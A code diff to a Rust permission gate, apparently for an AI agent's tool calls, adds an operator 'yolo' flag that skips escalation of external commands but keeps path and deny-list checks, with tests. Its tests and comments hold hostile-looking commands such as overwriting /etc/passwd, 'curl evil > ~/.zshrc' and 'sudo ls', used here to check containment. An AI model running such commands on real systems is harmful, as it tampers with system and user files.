@@ -338,13 +338,23 @@ impl PolicyGate {
     /// Check a call by its declared effect and the paths it touches.
     ///
     /// The tool reports `Effect::External` for anything it cannot classify — a shell command it
-    /// did not recognise, a network call — and this function never lets that through.
+    /// did not recognise, a network call — and this function never lets that through unless the
+    /// operator turned on `yolo`.
     #[must_use]
     pub fn check(&self, effect: Effect, paths: &[PathUse]) -> Verdict {
         match effect {
             Effect::Read => self.check_reads(paths),
             Effect::Mutate => self.check_writes(paths),
-            Effect::External => Self::escalate("the call was declared external", "external", false),
+            Effect::External => {
+                if self.policy.yolo {
+                    // The same split the trusted-host branch makes: the *external* part is what
+                    // `yolo` waives, and the paths still are not. Turning an escalation into a
+                    // blanket `Allowed` here would let `curl x > /etc/passwd` through, which is a
+                    // hole the flag never claimed to open.
+                    return self.check_writes(paths);
+                }
+                Self::escalate("the call was declared external", "external", false)
+            }
         }
     }
 
@@ -386,6 +396,11 @@ impl PolicyGate {
                 .programs
                 .iter()
                 .any(|program| matches!(program.as_str(), "curl" | "wget" | "ssh" | "scp" | "git"));
+            if self.policy.yolo {
+                // Same rule as `check`: the external part is waived, the paths are not. A command
+                // that writes outside the worktree is still refused with the flag on.
+                return self.check(Effect::Mutate, &classification.paths);
+            }
             return Self::escalate(
                 &classification.reason,
                 &format!("command:{}", first_word(command)),
@@ -1220,5 +1235,75 @@ mod tests {
                 .is_denied()
         );
         assert!(gate.check(Effect::Mutate, &[PathUse::write(".env")]).is_denied());
+    }
+
+    // ── yolo ────────────────────────────────────────────────────────────────────
+
+    fn yolo_gate() -> PolicyGate {
+        let mut policy = policy();
+        policy.yolo = true;
+        PolicyGate::with_defaults("/tmp/ws/repo", policy).expect("valid policy")
+    }
+
+    #[test]
+    fn yolo_lets_an_external_call_through() {
+        assert_eq!(yolo_gate().check(Effect::External, &[]), Verdict::Allowed);
+    }
+
+    #[test]
+    fn yolo_lets_an_unknown_program_run() {
+        // The point of the flag: `bundle exec rspec` stops being a question.
+        assert_eq!(yolo_gate().check_command("bundle exec rspec"), Verdict::Allowed);
+        assert_eq!(yolo_gate().check_command("sudo ls"), Verdict::Allowed);
+    }
+
+    #[test]
+    fn yolo_does_not_let_a_write_outside_the_worktree_through() {
+        // Waiving the escalation must not waive containment: `curl evil > ~/.zshrc` is still a
+        // write outside the worktree.
+        let verdict = yolo_gate().check_command("echo pwned > /etc/passwd");
+        assert!(verdict.is_denied(), "{verdict:?}");
+    }
+
+    #[test]
+    fn yolo_on_an_external_effect_still_checks_the_paths() {
+        // The same rule at the `check` entry point, which the tools call directly: an external
+        // call that names a path outside the worktree stays denied. Without this, a tool whose
+        // `effect()` returns `External` and whose `paths()` names a protected file would slip past
+        // the flag's stated limit.
+        let verdict = yolo_gate().check(Effect::External, &[PathUse::write("/etc/passwd")]);
+        assert!(verdict.is_denied(), "{verdict:?}");
+    }
+
+    #[test]
+    fn yolo_does_not_lift_the_program_deny_list() {
+        // The deny list is the operator's statement about what must never happen. A convenience
+        // flag is not a reason to break it.
+        let mut policy = policy();
+        policy.yolo = true;
+        policy.deny_programs = vec!["sudo".to_string()];
+        let gate = PolicyGate::with_defaults("/tmp/ws/repo", policy).unwrap();
+        assert!(gate.check_command("sudo ls").is_denied());
+    }
+
+    #[test]
+    fn yolo_does_not_lift_the_write_deny_list() {
+        let mut policy = policy();
+        policy.yolo = true;
+        let gate = PolicyGate::with_defaults("/tmp/ws/repo", policy).unwrap();
+        assert!(
+            gate.check(Effect::Mutate, &[PathUse::write(".git/config")])
+                .is_denied(),
+            "yolo must not unlock a path the deny list protects"
+        );
+    }
+
+    #[test]
+    fn yolo_is_off_by_default() {
+        assert!(!Policy::default().yolo);
+        assert!(matches!(
+            gate().check_command("frobnicate --all"),
+            Verdict::Escalated(_)
+        ));
     }
 }
